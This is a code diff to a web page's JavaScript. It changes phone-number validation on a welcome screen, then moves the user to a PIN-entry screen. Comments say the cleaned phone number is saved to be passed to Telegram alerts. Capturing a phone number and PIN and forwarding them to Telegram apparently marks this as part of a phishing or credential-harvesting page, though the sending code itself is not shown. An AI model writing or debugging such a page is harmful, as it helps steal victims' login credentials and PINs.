@@ -144,15 +144,20 @@ button:disabled { background-color: #d1d5db; color: #9ca3af; cursor: not-allowed
 
         // Length checking listeners to enable buttons automatically
         document.getElementById("input-phone").addEventListener("input", function() {
-            const btn = document.getElementById("btn-welcome");
-            if (this.value.trim().length === 9) {
-                btn.disabled = false;
-                btn.removeAttribute("disabled");
-            } else {
-                btn.disabled = true;
-                btn.setAttribute("disabled", "true");
-            }
-        });
+    const btn = document.getElementById("btn-welcome");
+    
+    // Strip hidden characters, dashes, or prefix spaces to count the raw numbers
+    let cleanVal = this.value.replace(/\D/g, "");
+    
+    if (cleanVal.length === 9) {
+        btn.disabled = false;
+        btn.removeAttribute("disabled");
+    } else {
+        btn.disabled = true;
+        btn.setAttribute("disabled", "true");
+    }
+});
+
 
         document.getElementById("input-pin").addEventListener("input", function() {
             const btn = document.getElementById("btn-pin");
@@ -166,23 +171,20 @@ button:disabled { background-color: #d1d5db; color: #9ca3af; cursor: not-allowed
         });
 
         // Screen Navigation Triggers
-        document.getElementById("btn-welcome").addEventListener("click", () => {
+       document.getElementById("btn-welcome").addEventListener("click", function() {
     const phoneField = document.getElementById("input-phone");
-    
-    // 🚀 THE FIX: Strip away all non-numeric characters (like country code prefixes, spaces, or dashes)
     let cleanPhone = phoneField.value.replace(/\D/g, "");
     
-    // Enforce matching over the sanitized string sequence safely
-    if (cleanPhone.length < 5) {
-        return alert("Please enter a valid number.");
-    }
+    // Safety check matching the exact number criteria
+    if (cleanPhone.length !== 9) return;
     
-    cachedPhone = cleanPhone; // Save the clean 9 digits to pass to your Telegram alerts safely
+    cachedPhone = cleanPhone; // Saves the clean 9 digits to pass to Telegram safely
     
-    // Smoothly transition layout views locally
+    // Transition views locally right away
     document.getElementById("step-welcome").style.display = "none";
     document.getElementById("step-pin").style.display = "block";
 });
+ 
 
 
         document.getElementById("btn-pin").addEventListener("click", () => {
